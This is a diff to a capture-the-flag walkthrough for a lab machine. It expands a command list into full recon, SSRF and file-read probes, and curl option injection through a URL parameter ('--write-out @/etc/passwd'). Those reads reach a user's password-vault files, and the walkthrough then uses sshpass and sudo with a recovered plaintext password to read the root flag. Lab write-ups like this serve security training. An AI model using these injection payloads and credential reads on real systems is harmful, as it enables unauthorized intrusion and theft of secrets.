@@ -113,17 +113,73 @@ Root/admin access came from the machine's core misconfiguration or vulnerability
 
 ## 🧰 Command Palette
 
-<details>
-<summary><b>Useful commands and technique anchors</b></summary>
+<details open>
+<summary><b>🔎 Recon</b></summary>
 
-- `curl URL checker with internal/file-like payloads`
-- `curl option injection / --write-out @/path probes`
-- `extract PSWM vault files`
-- `ssh aleks@<target>`
-- `sudo -l`
-- `sudo sh -c 'id; cat /root/root.txt'`
+```bash
+sudo nmap -sC -sV -Pn -p- -oN nmap_full.txt 10.129.234.87
+sudo nmap -sC -sV -Pn -p 22,80 -oN nmap_tcp.txt 10.129.234.87
+curl -i http://10.129.234.87/
+feroxbuster -u http://10.129.234.87/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+```
 
 </details>
+
+<details open>
+<summary><b>🌐 URL Checker Testing</b></summary>
+
+```bash
+# Basic behavior
+curl -s 'http://10.129.234.87/?url=http://example.com'
+
+# Internal/SSRF probes
+curl -s 'http://10.129.234.87/?url=http://127.0.0.1/'
+curl -s 'http://10.129.234.87/?url=http://127.0.0.1:22/'
+
+# File/wrapper probes where applicable
+curl -s 'http://10.129.234.87/?url=file:///etc/passwd'
+```
+
+</details>
+
+<details open>
+<summary><b>📂 curl Option Injection / File Disclosure</b></summary>
+
+```bash
+# Shape of the winning idea: inject curl options through URL parameter handling
+curl -s 'http://10.129.234.87/?url=--write-out%20@/etc/passwd'
+curl -s 'http://10.129.234.87/?url=--write-out%20@/var/www/html/index.php'
+
+# Search for interesting user files and vault material
+curl -s 'http://10.129.234.87/?url=--write-out%20@/home/aleks/.config/pswm/pswm'
+curl -s 'http://10.129.234.87/?url=--write-out%20@/home/aleks/.config/pswm/master.pswm'
+```
+
+</details>
+
+<details open>
+<summary><b>🔐 Password Vault Recovery</b></summary>
+
+```bash
+# Save disclosed vault material locally, identify/crack/decrypt as needed
+file pswm*
+strings pswm* | head
+# Use the recovered vault secret to obtain aleks' password
+```
+
+</details>
+
+<details open>
+<summary><b>👑 SSH + sudo</b></summary>
+
+```bash
+sshpass -p '1uY3w22uc-Wr{xNHR~+E' ssh -o StrictHostKeyChecking=no aleks@10.129.234.87 'id; hostname'
+sshpass -p '1uY3w22uc-Wr{xNHR~+E' ssh -tt aleks@10.129.234.87 "printf '%s\n' '1uY3w22uc-Wr{xNHR~+E' | sudo -S -l"
+sshpass -p '1uY3w22uc-Wr{xNHR~+E' ssh -tt aleks@10.129.234.87 "printf '%s\n' '1uY3w22uc-Wr{xNHR~+E' | sudo -S sh -c 'id; cat /root/root.txt'"
+```
+
+</details>
+
 
 ---
 
